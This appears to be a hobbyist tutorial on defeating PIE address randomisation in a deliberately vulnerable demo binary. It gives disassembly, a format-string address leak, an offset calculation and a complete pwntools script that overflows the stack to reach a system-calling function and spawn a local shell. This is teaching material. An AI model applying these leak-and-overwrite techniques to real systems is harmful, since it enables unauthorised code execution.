# PIE / PIC:
What is PIE / PIC? Position independent executable / position independent code (PIE / PIC) is a mechanism that takes over the idea of how the dynamic linker / loader will load your program into memory. See your program is loaded into memory via ld.so, which is the object file for the linux dynamic linker and loader and the loaders job is to figured out where to load your binay into memory at. The purpose of PIE is to randomize the base address of the binary upon run-time thus we cannot hardcode things like symbol addresses or memory addresses inside of the binary. So what does that look like?

# Binary analysis:
```ocaml
ïŒƒ ï¼  ~/Desktop/binexp/stack/PIE â¯ file demo                                                       ï‚€  2.18 ïƒ¤  6.17G ï•¸ 100%
demo: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=480d87fd2ece3ab23e4e48fe7eec425fa953c73e, for GNU/Linux 4.4.0, not stripped
```
``pie executable``, this goes to show that this is a PIE exectuable. Let's go into more explanation on how we can really bypass and exploit a program that has PIE enabled. Let's do some static reverse engineering on our binary:
```asm
gefâ¤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  system@plt
0x0000000000001050  printf@plt
0x0000000000001060  read@plt
0x0000000000001070  setvbuf@plt
0x0000000000001080  _start
0x00000000000010b0  deregister_tm_clones
0x00000000000010e0  register_tm_clones
0x0000000000001120  __do_global_dtors_aux
0x0000000000001170  frame_dummy
0x0000000000001179  setup
0x00000000000011cb  you_win
0x00000000000011e1  vulnerable
0x000000000000123d  main
0x0000000000001250  __libc_csu_init
0x00000000000012c0  __libc_csu_fini
0x00000000000012c8  _fini
```
MMMMH, ``you_win`` && ``vulnerable``, lets go look at ``you_win`` then ``vulnerable`` ğŸ˜‹:
```asm
Dump of assembler code for function you_win:
   0x00000000000011cb <+0>:	push   rbp
   0x00000000000011cc <+1>:	mov    rbp,rsp
   0x00000000000011cf <+4>:	lea    rax,[rip+0xe41]        # 0x2017
   0x00000000000011d6 <+11>:	mov    rdi,rax
   0x00000000000011d9 <+14>:	call   0x1040 <system@plt>
   0x00000000000011de <+19>:	nop
   0x00000000000011df <+20>:	pop    rbp
   0x00000000000011e0 <+21>:	ret    
End of assembler dump.
```
Seems to call ``system`` in an effort to execute a shell? Let's go look at main and see if we can just win from that.
```asm
Dump of assembler code for function main:
   0x000000000000123d <+0>:	push   rbp
   0x000000000000123e <+1>:	mov    rbp,rsp
   0x0000000000001241 <+4>:	call   0x11e1 <vulnerable>
   0x0000000000001246 <+9>:	mov    eax,0x0
   0x000000000000124b <+14>:	pop    rbp
   0x000000000000124c <+15>:	ret    
```
Awww man, no easy shell :(. Let's go have a look at ``vulnerable`` now.

```asm
gefâ¤  disass vulnerable
Dump of assembler code for function vulnerable:
   0x00000000000011e1 <+0>:  	push   rbp
   0x00000000000011e2 <+1>:	mov    rbp,rsp
   0x00000000000011e5 <+4>: 	sub    rsp,0x40
   0x00000000000011e9 <+8>:	lea    rax,[rbp-0x40]
   0x00000000000011ed <+12>:	mov    edx,0x40
   0x00000000000011f2 <+17>:	mov    rsi,rax
   0x00000000000011f5 <+20>:	mov    edi,0x0
   0x00000000000011fa <+25>:	call   0x1060 <read@plt>
   0x00000000000011ff <+30>:	lea    rax,[rip+0xe19]        # 0x201f
   0x0000000000001206 <+37>:	mov    rdi,rax
   0x0000000000001209 <+40>:	mov    eax,0x0
   0x000000000000120e <+45>:	call   0x1050 <printf@plt>
   0x0000000000001213 <+50>:	lea    rax,[rbp-0x40]
   0x0000000000001217 <+54>:	mov    rdi,rax
   0x000000000000121a <+57>:	mov    eax,0x0
   0x000000000000121f <+62>:	call   0x1050 <printf@plt>
   0x0000000000001224 <+67>:    lea    rax,[rbp-0x40]
   0x0000000000001228 <+71>:	mov    edx,0x1f4
   0x000000000000122d <+76>:	mov    rsi,rax
   0x0000000000001230 <+79>:	mov    edi,0x0
   0x0000000000001235 <+84>:	call   0x1060 <read@plt>
   0x000000000000123a <+89>:	nop
   0x000000000000123b <+90>:	leave  
   0x000000000000123c <+91>:	ret    
End of assembler dump.
```
Well, wippty-dippty-do there's a buffer overflow (imagine that), we can signfify there's an overflow with ``edx`` holding the value of ``0x1f4`` aka the ``size_t n`` parameter that dictates however many bytes we read into ``QWORD [rbp-0x40]`` which is where the buffer overflow happens (the second call to read). So we have idenitified we have a vulnerable binary (woah, didn't know that! Almost like I made it!). Now that we have found the vulnerability let's go into the logic and principles on how we are going to jump to ``you_win``.

# Philosophy:
There are 2 prinicples to bypassing PIE:
```
1.) Brute-forcing memory addresses, this is a quite effective method but not 
very efficient or time-efficient method of finding a leaked address.

2.) Arbitrary reads, we can take over things like arbitrary reads / format 
string vulnerabilities to leak base addresses of our binary which we can 
use to construct a base to access other things in our binary because PIE 
only randomizes where our binary is laid out in memory, meaning the offsets 
are going to be relative to where you are in the binary.
```

# Exploitation:
So with this knowledge, let's try to leak a base address which we can make more accurate if we go look at memory mappings to see obtain a general idea of where our binary is placed: 
```asm
gefâ¤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/layta/Desktop/binexp/stack/PIE/demo
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/layta/Desktop/binexp/stack/PIE/demo
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/layta/Desktop/binexp/stack/PIE/demo
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/layta/Desktop/binexp/stack/PIE/demo
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/layta/Desktop/binexp/stack/PIE/demo
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7ddc000   0x00007ffff7dde000   0x0000000000000000 rw- 
0x00007ffff7dde000   0x00007ffff7e04000   0x0000000000000000 r-- /usr/lib/libc-2.33.so
0x00007ffff7e04000   0x00007ffff7f4f000   0x0000000000026000 r-x /usr/lib/libc-2.33.so
0x00007ffff7f4f000   0x00007ffff7f9b000   0x0000000000171000 r-- /usr/lib/libc-2.33.so
0x00007ffff7f9b000   0x00007ffff7f9e000   0x00000000001bc000 r-- /usr/lib/libc-2.33.so
0x00007ffff7f9e000   0x00007ffff7fa1000   0x00000000001bf000 rw- /usr/lib/libc-2.33.so
0x00007ffff7fa1000   0x00007ffff7fac000   0x0000000000000000 rw- 
0x00007ffff7fc7000   0x00007ffff7fcb000   0x0000000000000000 r-- [vvar]
0x00007ffff7fcb000   0x00007ffff7fcd000   0x0000000000000000 r-x [vdso]
0x00007ffff7fcd000   0x00007ffff7fce000   0x0000000000000000 r-- /usr/lib/ld-2.33.so
0x00007ffff7fce000   0x00007ffff7ff2000    0x0000000000001000 r-x /usr/lib/ld-2.33.so
0x00007ffff7ff2000    0x00007ffff7ffb000    0x0000000000025000 r-- /usr/lib/ld-2.33.so
0x00007ffff7ffb000    0x00007ffff7ffd000    0x000000000002d000 r-- /usr/lib/ld-2.33.so
0x00007ffff7ffd000    0x00007ffff7fff000    0x000000000002f000 rw- /usr/lib/ld-2.33.so
0x00007ffffffde000    0x00007ffffffff000     0x0000000000000000 rw- [stack]
0xffffffffff600000      0xffffffffff601000      0x0000000000000000 --x [vsyscall]
```

let's try and look for a leak with an address somewhat relative to ``0x0000555...``:
```asm
gefâ¤  r
Starting program: /home/layta/Desktop/binexp/stack/PIE/demo 
Enter your name!: 
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
Hello!0x7fffffffc010 (nil) 0x7ffff7ecd907 (nil) 0x7ffff7f9ea60 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x7fffffffe180 0x555555555246 (nil) 0x7ffff7e05b25 0x7fffffffe278 0x100000064 0x55555555523d 0x1000 %ï¿½ï¿½ï¿½ï¿½ï¿½[Inferior 1 (process 161481) exited normally]
gefâ¤  xinfo 0x555555555246
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ xinfo: 0x555555555246 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Page: 0x0000555555555000  â†’  0x0000555555556000 (size=0x1000)
Permissions: r-x
Pathname: /home/layta/Desktop/binexp/stack/PIE/demo
Offset (from page): 0x246
Inode: 39847802
Segment: .text (0x0000555555555080-0x00005555555552c5)
Offset (from segment): 0x1c6
Symbol: main+9
gefâ¤  
```
seems like we popped an address that's relative to the ``.text`` section which is the section that holds our code, let's see the other relative address here: 
```asm
gefâ¤  xinfo 0x55555555523d
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ xinfo: 0x55555555523d â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Page: 0x0000555555555000  â†’  0x0000555555556000 (size=0x1000)
Permissions: r-x
Pathname: /home/layta/Desktop/binexp/stack/PIE/demo
Offset (from page): 0x23d
Inode: 39847802
Segment: .text (0x0000555555555080-0x00005555555552c5)
Offset (from segment): 0x1bd
Symbol: main
```
Mmmh another ``main`` symbol but not with an offset. Let's try to use that in our explotiation script.

# Profit
```py
#!/usr/bin/env python3

from pwn import *

p = process("./demo")                       # Process interaction.
binary = ELF("./demo")                      # Binary initialization.

p.sendline(b"%20$p")                        # Sending the format specificer "%p" at offset 20.
p.recvuntil(b"Hello!")                      # Stripping magic.

leak = int(p.recvline()[:-1], 16)           # Read the leaked value and strip the excess fluff.
log.success("PIE leak : %s" % hex(leak))    # Log the leak.

p.interactive()                             # Interactive interface.
```
here's our current script to try and leak the address:

```ocaml
ïŒƒ ï¼  ~/Desktop/binexp/stack/PIE â¯ ./exploit.py                                                        ï‚€  1.82 ïƒ¤  6.15G ï•¸ 100%
[+] Starting local process './demo': pid 161853
[*] '/home/layta/Desktop/binexp/stack/PIE/demo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] PIE leak : 0x562c70d1b23d
[*] Switching to interactive mode
$  
```
seems about right, let's calculate return address offsets and everything else:
```asm
gefâ¤  x/xg $sp
0x7fffffffe178:	0x616161616161616a
gefâ¤  pattern offset 0x616161616161616a
[+] Searching for '0x616161616161616a'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 65 (big-endian search) 
```
Seems as if the return address offset is ``72``, lets use our leak and see if we can pop a shell:
# Shell!!!
```py
#!/usr/bin/env python3

from pwn import *

p = process("./demo")                       # Process interaction.
binary = ELF("./demo")                      # Binary initialization.

p.sendline(b"%20$p")                        # Sending the format specificer "%p" at offset 20.
p.recvuntil(b"Hello!")                      # Stripping magic.

leak = int(p.recvline()[:-1], 16)           # Read the leaked value and strip the excess fluff.
log.success("PIE leak : %s" % hex(leak))    # Log the leak.

rip_offset = 72                              # Return address offset.
rip_padding = b"A" * rip_offset              # Return addressing byte-padding.

base = leak - binary.symbols["main"]        # Leaking the main symbol address.
binary.address = base                       # Translating the binary base address to the base we leaked - the offset of main.

payload = rip_padding                       # Return address padding.
payload += p64(binary.symbols["you_win"])   # you_win offset + our updated binary base address = you_win address symbol.

p.sendline(payload)                         # Profit???
p.interactive()                             # ???
```
here's the final state of the PIE bypass PoC, lets see if it works:
```ocaml
ïŒƒ ï¼  ~/Desktop/binexp/stack/PIE â¯ ./exploit.py                                                    ï‚€  6.31 ïƒ¤  5.97G ï•¸ 100%
[+] Starting local process './demo': pid 165088
[*] '/home/layta/Desktop/binexp/stack/PIE/demo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] PIE leak : 0x56133104a23d
[*] Switching to interactive mode
$ echo "Interesting"
Interesting
$ whoami
layta
$  
```

P.S: I've more than likely explained something severally wrong due to my retardation, please notify me on discord @ ``f(x)#1006`` on discord to yell at me.
